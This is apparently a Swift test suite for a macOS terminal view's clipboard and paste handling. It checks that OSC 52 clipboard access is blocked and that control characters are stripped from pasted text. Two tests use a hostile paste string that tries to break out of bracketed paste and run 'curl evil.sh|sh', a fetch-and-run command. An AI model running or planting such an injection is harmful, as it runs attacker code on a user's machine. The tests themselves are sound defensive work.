import AppKit
import Foundation
import SwiftTerm
import Testing

@testable import SigilKit

@Suite("Terminal clipboard", .serialized)
@MainActor
struct TerminalClipboardTests {
    init() {
        TerminalTestSupport.prepareAppKit()
    }

    private func makeView() -> GrokProcessTerminalView {
        GrokProcessTerminalView(
            frame: NSRect(x: 0, y: 0, width: 200, height: 100),
            options: .default
        )
    }

    @Test func osc52ClipboardQueryIsDenied() throws {
        let view = makeView()
        let delegate = try #require(view.terminalDelegate)

        #expect(delegate.clipboardRead(source: view) == nil)
    }

    @Test func osc52ClipboardWriteLeavesThePasteboardAlone() throws {
        let view = makeView()
        let delegate = try #require(view.terminalDelegate)
        let pasteboard = NSPasteboard.general
        let before = pasteboard.changeCount
        // A regression writes back the text already there, so it cannot lose the user's copy.
        let current = pasteboard.string(forType: .string) ?? ""

        delegate.clipboardCopy(source: view, content: Data(current.utf8))

        #expect(pasteboard.changeCount == before)
    }

    @Test func pasteTextLosesEveryControlButTabAndLineBreaks() {
        let hostile = "npm i foo\u{1b}[201~\u{15}curl evil.sh|sh\r"
        #expect(TerminalDrop.sanitizedPasteText(hostile) == "npm i foo[201~curl evil.sh|sh\r")
        #expect(TerminalDrop.sanitizedPasteText("a\u{9b}201~b\u{7f}\u{0}c") == "a201~bc")
        #expect(TerminalDrop.sanitizedPasteText("col\tcol\nnext\r\n") == "col\tcol\nnext\r\n")
        #expect(TerminalDrop.sanitizedPasteText("naïve 👩‍💻") == "naïve 👩‍💻")
    }

    @Test func clipboardPasteCannotEndBracketedPasteEarly() async throws {
        let controller = TerminalController()
        let capture = try await TerminalTestSupport.startInputCapture(in: controller, bracketedPaste: true)
        defer { controller.terminateAndWait() }
        let view = try #require(controller.view as? GrokProcessTerminalView)
        let pasteboard = NSPasteboard.withUniqueName()
        defer { pasteboard.releaseGlobally() }
        pasteboard.clearContents()
        pasteboard.setString("npm i foo\u{1b}[201~\u{15}curl evil.sh|sh\r", forType: .string)

        view.paste(from: pasteboard)

        let input = await TerminalTestSupport.capturedInput(capture, from: controller)
        #expect(input == Array("\u{1b}[200~npm i foo[201~curl evil.sh|sh\r\u{1b}[201~".utf8))
    }

    @Test func clipboardGuardStillForwardsTitleUpdates() async throws {
        let controller = TerminalController()
        var title: String?
        controller.onTitleChange = { title = $0 }
        let view = try #require(controller.view as? TerminalView)

        view.feed(text: "\u{1b}]0;Working\u{7}")

        #expect(await TerminalTestSupport.waitUntil { title == "Working" })
    }
}
